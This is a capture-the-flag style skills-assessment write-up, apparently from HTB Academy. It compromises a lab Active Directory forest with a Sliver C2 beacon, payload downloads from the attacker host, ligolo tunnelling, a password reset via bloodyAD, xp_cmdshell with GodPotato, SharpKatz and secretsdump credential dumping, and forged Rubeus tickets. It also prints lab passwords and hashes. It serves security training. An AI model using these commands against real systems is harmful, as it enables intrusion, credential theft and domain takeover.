### Submit the contents of the flag.txt found on one of the user's desktop

```sh
nmap -sC -sV 10.129.229.225
```

![](Screenshot%202026-11-19%20at%2012.54.09.png)

```sh
echo "10.129.229.225 sde.inlanefreight.local" | sudo tee -a /etc/hosts

xfreerdp /v:10.129.229.225 /u:htb-student /p:'HTB_@cademy_stdnt!' /dynamic-resolution /cert:ignore
```

![](Screenshot%202026-11-19%20at%2013.00.28.png)

In Sliver C2

```sh
[server] sliver > generate beacon --http 10.10.14.140:9001 --skip-symbols --os windows -N http-beacon-9001

[*] Generating new windows/amd64 beacon implant binary (1m0s)
[!] Symbol obfuscation is disabled
[*] Build completed in 10s
[*] Implant saved to /home/htb-ac-1951749/http-beacon-9001.exe

[server] sliver > http -L 10.10.14.140 -l 9001

[*] Starting HTTP :9001 listener ...
[*] Successfully started job #1
```

Then host the server and transfer the beacon to victim machine

Attacker:

```sh
python3 -m http.server 1234
```

![](Screenshot%202026-11-19%20at%2013.00.54.png)

Victim:

```powershell
wget http://10.10.14.140:1234/http-beacon-9001.exe -o http-beacon-9001.exe
```

![](Screenshot%202026-11-19%20at%2013.02.16.png)

Now execute the beacon

![](Screenshot%202026-11-19%20at%2013.04.45.png)

```sh
shell
whoami /priv
```

![](Screenshot%202026-11-19%20at%2013.13.42.png)

So we can't use Potato Attack

Let's use sharp-hound

```sh
sharp-hound-4 -- -c ALL --zipfilename sde-inlanefreight
```

![](Screenshot%202026-11-19%20at%2014.34.14.png)

On attacker machine I host PowerView.ps1

```sh
python3 -m http.server 1234
Serving HTTP on 0.0.0.0 port 1234 (http://0.0.0.0:1234/) ...
10.129.229.225 - - [19/Nov/2026 02:37:32] "GET /PowerView.ps1 HTTP/1.1" 200 -
```

And on Sliver Implant

```sh
sharpsh -- '-u http://10.10.14.140:1234/PowerView.ps1 -e -c R2V0LURvbWFpbkNvbXB1dGVyIHwgc2VsZWN0IG5hbWUgfCBSZXNvbHZlLUlQQWRkcmVzcw=='
```

also, the base64  `echo -n "Get-DomainComputer | select name | Resolve-IPAddress" | base64`

![](Screenshot%202026-11-19%20at%2014.39.07.png)

Let add these entries into /etc/hosts

![](Screenshot%202026-11-19%20at%2014.41.39.png)

Now, let's setup ligolo

```sh
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up

sudo ./proxy -selfcert -laddr 0.0.0.0:11601
```

```powershell
wget http://10.10.14.140:1234/agent.zip -o agent.exe
.\agent.exe -connect 10.10.14.140:11601 -ignore-cert
```

![](Screenshot%202026-11-19%20at%2014.46.14.png)

```sh
sudo ip route add 172.16.84.0/24 dev ligolo
sudo ip route add 172.16.85.0/24 dev ligolo
```

![](Screenshot%202026-11-19%20at%2014.52.12.png)

```sh
nxc smb 172.16.84.5 -u sde.inlanefreight.local\\htb-student -p 'HTB_@cademy_stdnt!'
```

![](Screenshot%202026-11-19%20at%2014.52.49.png)

Using bloodyAD to change Felipe's password

```sh
bloodyAD --host 172.16.84.5 -d sde.inlanefreight.local -u htb-student -p 'HTB_@cademy_stdnt!' set password felipe 'Password123!'
```

```sh
nxc smb 172.16.84.5 -u sde.inlanefreight.local\\felipe -p 'Password123!'
```

![](Screenshot%202026-11-19%20at%2014.55.50.png)

```sh
impacket-wmiexec sde.inlanefreight.local/felipe:'Password123!'@srv09.sde.inlanefreight.local "start C:\Users\htb-student\http-beacon-9001.exe"
```

![](Screenshot%202026-11-19%20at%2015.02.01.png)

![](Screenshot%202026-11-19%20at%2015.02.51.png)
### Submit the contents of the flag.txt file found on the Administrator's desktop

```sh
execute -o powershell -c 'cat C:\Users\Administrator\Desktop\flag.txt'
```

![](Screenshot%202026-11-19%20at%2015.46.44.png)
### Escalate your privileges and submit the contents of the flag.txt file on the Administrator's desktop on the domain controller

```sh
execute -o powershell -c 'gci C:\Users\ -recurse -Filter *.ps1 -ErrorAction SilentlyContinue'
```

![](Screenshot%202026-11-19%20at%2015.05.08.png)

```sh
execute -o powershell -c 'cat C:\Users\Administrator\Automation_Project\mssql_automation.ps1'
```

![](Screenshot%202026-11-19%20at%2015.05.49.png)

```sh
impacket-mssqlclient dbuser:'D@tab3s_PRoj3ct0@'@172.16.84.5
```

```sh
SQL (dbuser  dbo@master)> enable_xp_cmdshell
INFO(DC02\SQLEXPRESS): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
INFO(DC02\SQLEXPRESS): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL (dbuser  dbo@master)> xp_cmdshell whoami /priv
```

![](Screenshot%202026-11-19%20at%2015.07.22.png)

We got SeImpersonatePrivilege is Enabled

Let's use GodPotato [https://github.com/BeichenDream/GodPotato](https://github.com/BeichenDream/GodPotato)

```sh
pivots tcp

generate --tcp-pivot 172.16.84.20:9898 --skip-symbols -N pivot
```

![](Screenshot%202026-11-19%20at%2015.10.23.png)

```sh
listener_add --addr 172.16.84.20:8081 --to 127.0.0.1:8888 --tcp
```

![](Screenshot%202026-11-19%20at%2015.17.51.png)

```cmd
xp_cmdshell certutil -urlcache -f http://172.16.84.20:8081/pivot.exe C:\Temp\pivot.exe

xp_cmdshell certutil -urlcache -f http://172.16.84.20:8081/GodPotato-NET4.exe C:\Temp\GodPotato-NET4.exe
```

![](Screenshot%202026-11-19%20at%2015.20.53.png)

![](Screenshot%202026-11-19%20at%2015.21.00.png)

```cmd
xp_cmdshell C:\Temp\GodPotato.exe -cmd "C:\Temp\pivot.exe"
```

![](Screenshot%202026-11-19%20at%2015.43.13.png)
### Access the other domain controller in the forest and submit the contents of the flag.txt file on the Administrator's desktop

```sh
wget https://raw.githubusercontent.com/Flangvik/SharpCollection/master/NetFramework_4.0_Any/SharpKatz.exe

wget
https://raw.githubusercontent.com/Flangvik/SharpCollection/master/NetFramework_4.0_Any/Rubeus.exe
```

```sh
execute-assembly Rubeus.exe createnetonly /program:cmd.exe
```

![](Screenshot%202026-11-20%20at%2015.00.27.png)

```sh
SharpKatz -Command msv
```

```sh
impacket-secretsdump 'sde.inlanefreight.local/DC02$'@172.16.84.5 \
  -hashes :a13d2ee0c828d2d38ef2b1e676d660c3 \
  -just-dc-user SDE/krbtgt
```

![](Skills%20Assessment-20261121-165951.png)

```sh
sharpsh -- '-u http://10.10.14.140:8888/PowerView.ps1 -e -c R2V0LURvbWFpblNJRCAtRG9tYWluIGlubGFuZWZyZWlnaHQubG9jYWw='
```

```sh
execute-assembly /home/htb-ac-1951749/Rubeus.exe diamond /tgtdeleg /ticketuser:Administrator /ticketuserid:500 /groups:519 /sids:S-1-5-21-1091722548-1143476209-2285759316-519 /krbkey:161ca21b478565107a337eab8626f584c4cbe4d724e52f0ed7ff4c35234b7669 /nowrap /outfile:"C:\Windows\Temp\ticket.kirbi"
```

![](Screenshot%202026-11-20%20at%2014.58.24.png)

```sh
execute-assembly /home/htb-ac-1951749/Rubeus.exe ptt /luid:0xbc9a4 /ticket:"C:\Windows\Temp\ticket_2026_11_20_07_24_38_Administrator_to_krbtgt@SDE.INLANEFREIGHT.LOCAL.kirbi"
```

![](Screenshot%202026-11-20%20at%2014.58.43.png)

```sh
migrate -p 5252
```

![](Screenshot%202026-11-20%20at%2014.59.23.png)

```sh
shell

klist

type \\dc01.inlanefreight.local\C$\Users\Administrator\Desktop\flag.txt
```

![](Screenshot%202026-11-20%20at%2014.59.45.png)